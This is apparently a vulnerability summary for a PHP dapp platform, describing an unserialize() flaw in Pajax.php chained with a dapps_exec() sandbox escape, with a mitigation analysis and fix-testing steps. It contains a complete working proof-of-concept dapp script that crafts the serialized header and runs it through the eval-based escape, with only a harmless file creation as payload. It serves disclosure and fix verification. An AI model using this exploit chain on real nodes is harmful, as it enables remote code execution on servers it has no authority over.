# Pajax Vulnerability Summary

This document summarizes a critical security vulnerability in the `Pajax` class and the vector through which it can be exploited.

## The Vulnerability: Insecure Deserialization in `Pajax.php`

The file `include/class/Pajax.php` contains a class named `Pajax` that is vulnerable to insecure deserialization. The `processAjax()` method in this class takes user-provided data from the `HTTP_P_AJAX` header, base64-decodes it, and then passes it directly to the `unserialize()` function.

```php
// in include/class/Pajax.php -> processAjax()
$pAjax = json_decode(base64_decode($_SERVER['HTTP_P_AJAX']), true);
$viewData = unserialize(base64_decode($pAjax['viewData']));
```

This is a high-severity vulnerability that can lead to Remote Code Execution (RCE) if an attacker can control the serialized data.

## The Attack Vector: Dapps and Sandbox Escape

While the `Pajax` class is not used anywhere in the main application code, it can be called by a dapp running on the platform. The application provides a sandboxed environment for dapps, but a critical flaw allows a dapp to escape this sandbox and execute arbitrary code.

### Dapp Sandbox

Dapps are executed in a restricted environment using PHP's `disable_functions` and `open_basedir` settings. This is intended to prevent them from accessing the file system or executing dangerous commands.

### The Sandbox Escape: `dapps_exec()`

The `include/dapps.functions.php` file, which is available to all dapps, contains a function called `dapps_exec()`.

```php
function dapps_exec($code) {
	if(!dapps_is_local()) {
		exit;
	}
	$action = [
		"type"=>"dapps_exec",
		"code"=>$code,
	];
	echo "action:" . json_encode($action);
	exit;
}
```

This function allows a dapp to send a string of PHP code back to the main, unsandboxed node process, but only if the dapp is running on its host node (`dapps_is_local()`). The main process then executes this code using `eval()`, completely bypassing the sandbox.

---
## Analysis of the `dapps_is_local()` Check: A Critical Mitigating Factor

The `dapps_exec()` function, and therefore the entire attack vector, is protected by a `dapps_is_local()` check. This check is a **major mitigating factor**, but not a complete blocker.

### How it Works

The `dapps_is_local()` function works by checking for a `DAPPS_LOCAL` environment variable that is injected into the dapp's sandbox by the host node. The node sets this variable to `1` **only if** the ID of the dapp being requested matches the ID of the dapp the node is configured to host (defined in `$_config['dapps_public_key']`).

This check is performed by the trusted node against its own configuration. It **cannot be bypassed** by a remote user or a malicious dapp.

### Impact on the Attack Vector

*   **It PREVENTS remote attacks.** An attacker cannot create a malicious dapp, have a user run it, and exploit the vulnerability on an arbitrary node. The check will fail.

*   **It DOES NOT PREVENT a local attack.** The vulnerability is still exploitable if the *specific dapp the node operator has chosen to host* is either malicious itself or becomes compromised (e.g., through a supply chain attack or a secondary vulnerability).

In summary, the vulnerability can only be exploited by the dapp that the node is serving, not by any other dapp.

---

## Proof of Concept for Testing

This section provides a complete, working, and **non-destructive** Proof of Concept (PoC) to verify the vulnerability. This PoC will create an empty file at `/tmp/pajax_vulnerable`. This action is harmless but proves that Remote Code Execution is possible.

### The Gadget Chain in `Pajax.php`

A typical PHP Object Injection exploit requires finding a "gadget chain" of classes with magic methods like `__destruct()`. In this case, `Pajax.php` itself provides a very direct gadget. After unserializing the object, the code immediately calls a method on it, with the method name also being supplied by the user:

```php
// in Pajax.php -> processAjax()
$viewData = unserialize(base64_decode($pAjax['viewData'])); // Our object is created
$action = $pAjax['action'];                              // We control the method name
self::$class = $viewData;
// ...
if(method_exists(self::$class, $action)) {
    call_user_func([self::$class, $action]); // The method is called
}
```
This allows us to create a simple class with a known method and have the server execute it for us.

### The Malicious Dapp Script (`poc.php`)

This script would be placed within the dapp that the node is hosting.

```php
<?php
// in [hosted-dapp-id]/poc.php
dapps_init();

if (dapps_is_local()) {

    // 1. Define a simple class with a method that performs a harmless action.
    class PoC {
        public function execute() {
            // The non-destructive action: create an empty file.
            touch('/tmp/pajax_vulnerable');
        }
    }

    // 2. Create an instance of our PoC class and serialize it.
    $malicious_payload = serialize(new PoC());

    // 3. Craft the Pajax header.
    // 'viewData' contains our serialized object.
    // 'action' contains the name of the method we want to call on that object.
    $header_data = [
        "viewData" => base64_encode($malicious_payload),
        "action" => "execute", // This is the gadget
        "class" => "", "options" => "", "actionData" => "", "process" => ""
    ];
    $encoded_header = base64_encode(json_encode($header_data));

    // 4. Construct the code to be executed outside the sandbox.
    // This code simulates the request environment needed to trigger the vulnerability.
    $code_to_execute = '
        $_SERVER["HTTP_P_AJAX"] = "' . $encoded_header . '";
        require_once(ROOT . "/include/class/Pajax.php");
        Pajax::processAjax();
    ';

    // 5. Use the sandbox escape to run the exploit.
    dapps_exec($code_to_execute);

    echo "PoC executed. Check the server for the file /tmp/pajax_vulnerable";
} else {
    echo "This PoC only works when the dapp is running on its host node.";
}
?>
```

### How to Test the Fix

1.  **Confirm the Vulnerability:**
    *   Place the `poc.php` script inside the dapp folder that your node is configured to host.
    *   Execute the following command: `curl "http://[your-node-ip]/dapps.php?url=[hosted-dapp-id]/poc.php"`
    *   Check your server. The file `/tmp/pajax_vulnerable` should now exist.

2.  **Apply the Fix:**
    *   Implement your security patches (e.g., remove `dapps_exec()` from `dapps.functions.php` and delete `Pajax.php`).

3.  **Verify the Fix:**
    *   Delete the test file: `rm /tmp/pajax_vulnerable`
    *   Run the same `curl` command again.
    *   Check your server. The file `/tmp/pajax_vulnerable` should **not** exist, proving the exploit no longer works.
